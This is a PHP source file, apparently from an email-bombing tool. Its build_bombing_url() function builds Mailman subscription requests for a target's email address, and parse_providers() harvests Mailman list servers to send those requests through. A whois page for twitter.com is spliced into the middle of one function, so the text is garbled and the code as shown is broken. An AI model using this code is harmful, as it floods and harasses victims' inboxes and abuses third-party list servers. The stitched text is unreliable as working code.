<?php
function startsWith($haystack, $needle) {
    $length = strlen($needle);
    return substr($haystack, 0, $length) === $needle;
}

function endsWith($haystack, $needle) {
    $length = strlen($needle);
    if (!$length) {

Search for domains or IP addresses...
Interested in domain names? Click here to stay up to date with domain name news and promotions at Name.com
twitter.com is already registered. Interested in buying it? Make an Offer
.com
Taken
.net
Taken
.org
Taken
.co
Taken
.io
Taken
.app
Taken
.live
Taken
twitter.com
whois information
  
cache expires in 15 hours, 24 minutes and 54 seconds
 refresh
Registrar Info
Name
CSC CORPORATE DOMAINS, INC.
Whois Server
whois.corporatedomains.com
Referral URL
www.cscprotectsbrands.com
Status
clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited
serverDeleteProhibited http://www.icann.org/epp#serverDeleteProhibited
serverTransferProhibited http://www.icann.org/epp#serverTransferProhibited
Important Dates
Expires On
2024-01-21
Registered On
2000-01-21
Updated On
2023-03-07
Name Servers
a.r06.twtrdns.net
205.251.192.179
a.u06.twtrdns.net
204.74.66.101
b.r06.twtrdns.net
205.251.196.198
b.u06.twtrdns.net
204.74.67.101
c.r06.twtrdns.net
205.251.194.151
c.u06.twtrdns.net
204.74.110.101
d.r06.twtrdns.net
205.251.199.195
d.u06.twtrdns.net
204.74.111.101
Similar Domains
twitt-.com | twitt-book.com | twitt-book.net | twitt-book.org | twitt-booster.de | twitt-bot.com | twitt-dating-retail.com | twitt-er-tweet.com | twitt-er.com | twitt-erage.com | twitt-ercom.com | twitt-erfolg.com | twitt-erfolg.de | twitt-erfolg.info | twitt-ernet.com | twitt-err.com | twitt-face.com | twitt-farm.ru | twitt-heads.com | twitt-hot.com |        return true;
    }
    return substr($haystack, -$length) === $needle;
}

function pretty_json_encode($raw) {
    return json_encode($raw, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}

function println($msg) {
    echo $msg . PHP_EOL;
}

function build_bombing_url($node,$email) {
    $pw=generate_password(10);
    return $node.'?email='.$email.'&fullname=&pw='.$pw.'&pw-conf='.$pw.'&digest=0&language=en&email-button=Subscribe';
}

function generate_password($length = 8) {

    $chars = 'abcdefghijklmnoABCDEFGHIJKZ0123456789';

    $password = '';

    for ($i = 0; $i < $length; $i++) {
        $password .= $chars[mt_rand(0, strlen($chars) - 1)];

    }

    return $password;

}
function parse_providers($haystack){
    preg_match_all('/http[s]{0,1}:\/\/([A-Za-z0-9\-_\/:\.]*?)\/mailman/',$haystack,$m);
    $providers=[];
    foreach ($m[0] as $item){
        $url=$item.'/listinfo';
        if(startsWith($url,'https://')){
            $url='http://'.substr($url,8,strlen($url));
        }
        $providers[]=$url;
    }
    $providers=array_unique($providers);
    return $providers;
}
